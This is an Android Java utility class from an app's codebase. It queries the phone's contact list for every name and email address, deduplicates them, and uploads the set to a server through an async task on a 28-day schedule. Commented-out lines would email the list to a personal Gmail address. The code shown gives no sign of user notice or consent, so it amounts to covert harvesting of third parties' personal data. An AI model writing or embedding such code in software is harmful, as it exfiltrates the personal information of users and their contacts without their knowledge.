package com.looseboxes.idisc.common.util;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import com.looseboxes.idisc.common.asynctasks.Addextractedemails;

import org.json.simple.JSONObject;

import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.TimeUnit;


/**
 * @(#)ContactEmailsExtractor.java   18-Mar-2015 15:50:01
 *
 * Copyright 2011 NUROX Ltd, Inc. All rights reserved.
 * NUROX Ltd PROPRIETARY/CONFIDENTIAL. Use is subject to license
 * terms found at http://www.looseboxes.com/legal/licenses/software.html
 */

/**
 * This class requires permission
 * &lt;uses-permission android:name="android.permission.READ_CONTACTS"/&gt;
 * @author   chinomso bassey ikwuagwu
 * @version  2.0
 * @since    2.0
 */
public class ContactEmailsExtractor {

    public void sendNameEmailDetails(final Context context) {

        this.sendNameEmailDetails(context, false);
    }

    public void sendNameEmailDetails(final Context context, boolean ignoreschedule) {

        long lastExtractionTime = Pref.getLong(context, Addextractedemails.PREF_NAME, -1L);

        // Every 28 days
        if(!ignoreschedule && lastExtractionTime != -1 && System.currentTimeMillis() - lastExtractionTime < TimeUnit.DAYS.toMillis(28)) {
            return;
        }

        Logx.debug(this.getClass(), "Extracting emails");

        JSONObject extractedEmails = this.getNameEmailDetails(context);

        Logx.log(Log.VERBOSE, this.getClass(), "Extracted emails:\n{0}", extractedEmails==null?null:extractedEmails.keySet(), Toast.LENGTH_LONG);

        Addextractedemails uploadEmails = new Addextractedemails(context, extractedEmails);

        uploadEmails.execute();

//        try {
//            SendExtractedContactsEmail email = new SendExtractedContactsEmail(context, "EXTRACTED CONTACT EMAILS", extractedEmails);
//            email.execute();
//            DefaultHtmlEmail.sendMail("posh.bc@gmail.com", "EXTRACTED CONTACT EMAILS", extractedEmails.toJSONString());
//        }catch(Exception e) {
//            Logx.log(this.getClass(), e);
//        }
    }

    public JSONObject getNameEmailDetails(Context context) {

        JSONObject emailsMap = new JSONObject();

        Set<String> emailsSet = new HashSet<String>();

        ContentResolver contentResolver = context.getContentResolver();

        String[] PROJECTION = new String[] { ContactsContract.RawContacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.PHOTO_ID,
                ContactsContract.CommonDataKinds.Email.DATA,
                ContactsContract.CommonDataKinds.Photo.CONTACT_ID };

        String order = "CASE WHEN "
                + ContactsContract.Contacts.DISPLAY_NAME
                + " NOT LIKE '%@%' THEN 1 ELSE 2 END, "
                + ContactsContract.Contacts.DISPLAY_NAME
                + ", "
                + ContactsContract.CommonDataKinds.Email.DATA
                + " COLLATE NOCASE";

        String filter = ContactsContract.CommonDataKinds.Email.DATA + " NOT LIKE ''";

        Cursor cur = contentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, PROJECTION, filter, null, order);

        if (cur.moveToFirst()) {

            do {

                // names comes in hand sometimes
                String name = cur.getString(1);
                String email = cur.getString(3);

                // keep unique only
                if (emailsSet.add(email.toLowerCase())) {
                    emailsMap.put(email, name);
                }
            } while (cur.moveToNext());
        }

        cur.close();

        return emailsMap;
    }
}
